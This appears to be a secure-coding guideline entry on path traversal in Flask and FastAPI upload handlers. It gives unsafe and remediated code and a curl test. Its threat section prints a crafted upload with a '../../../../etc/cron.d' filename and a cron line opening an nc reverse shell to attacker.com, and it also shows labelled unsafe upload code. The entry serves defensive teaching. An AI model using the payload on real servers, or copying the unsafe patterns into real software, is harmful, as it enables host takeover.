---
id: TG-INPUT-006
title: Path Traversal and Unsafe Upload Storage
category: file-upload-handling
severity: Critical
confidence: Confirmed
frameworks:
  - django
  - flask
  - fastapi
cwe: CWE-22
asvs_v4: V12.1.1
nist_ssdf: PW.5.1
---

# TG-INPUT-006: Path Traversal and Unsafe Upload Storage

## 🚨 Problem Statement
Concatenating untrusted user input directly into file system paths without canonicalization or validation allows attackers to traverse directory boundaries (e.g., `../../etc/passwd`) and read or overwrite arbitrary files on the host system.

> **Tuning Guardrails (v0.5.6):**
> - **DO NOT treat** every `os.path.join()` as path traversal.
> - **ESCALATE** when untrusted filename/path input reaches file path construction or storage without canonicalization, allowlisting, sanitization (e.g., `secure_filename`), or safe generated naming.
> - **RECOGNIZE** project-approved filename normalization wrappers where evidence exists.

---

## 💥 Adversarial Threat & Exploitation
An attacker uploads a file with a relative path payload:
```http
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../../etc/cron.d/malicious_job"

* * * * * root /bin/nc -e /bin/sh attacker.com 4444
```
If the server performs `open(os.path.join(UPLOAD_DIR, file.filename), "wb")`, the file is written to `/etc/cron.d/`, resulting in arbitrary Remote Code Execution (RCE) on the host.

---

## 🛠️ Framework-Native Remediations

### 🐍 Flask (Werkzeug `secure_filename` + UUID Prefix)

#### ❌ Unsafe Pattern
```python
# Unsafe: Raw client filename in os.path.join
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    filepath = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(filepath)
```

#### ✅ Safe Remediation
```python
# Safe: Sanitize with secure_filename and generate a random UUID prefix
import uuid
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {".png", ".jpg", ".jpeg", ".pdf"}

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")
    if not file:
        return {"error": "No file"}, 400

    filename = secure_filename(file.filename)
    ext = os.path.splitext(filename)[1].lower()

    if ext not in ALLOWED_EXTENSIONS:
        return {"error": "Invalid file type"}, 400

    safe_name = f"{uuid.uuid4().hex}_{filename}"
    filepath = os.path.join(UPLOAD_FOLDER, safe_name)
    file.save(filepath)
    return {"status": "uploaded", "file_id": safe_name}
```

---

### 🐍 FastAPI (`UploadFile` & Safe Path Construction)

#### ❌ Unsafe Pattern
```python
# Unsafe: Direct path join with upload.filename
@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    dest = Path("/var/uploads") / file.filename
    with open(dest, "wb") as f:
        f.write(await file.read())
```

#### ✅ Safe Remediation
```python
# Safe: Whitelist extensions and store using generated UUIDs
import uuid
from pathlib import Path
from fastapi import FastAPI, UploadFile, File, HTTPException

UPLOAD_DIR = Path("/var/uploads").resolve()
ALLOWED_EXT = {".png", ".jpg", ".pdf"}

@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXT:
        raise HTTPException(status_code=400, detail="Disallowed file extension")

    safe_filename = f"{uuid.uuid4().hex}{ext}"
    destination = (UPLOAD_DIR / safe_filename).resolve()

    # Assert destination stays within UPLOAD_DIR
    if not str(destination).startswith(str(UPLOAD_DIR)):
        raise HTTPException(status_code=400, detail="Path traversal detected")

    content = await file.read(10 * 1024 * 1024) # Cap size to 10MB
    with open(destination, "wb") as buffer:
        buffer.write(content)

    return {"file_id": safe_filename}
```

---

## 🧪 Verification & Reproduction
1. Test with traversal filename:
   ```bash
   curl -F "file=@test.txt;filename=../../evil.txt" http://localhost:5000/upload
   ```
2. **Assertion:** Request must reject with `400 Bad Request` or save strictly inside upload directory as a sanitized UUID without directory traversal.
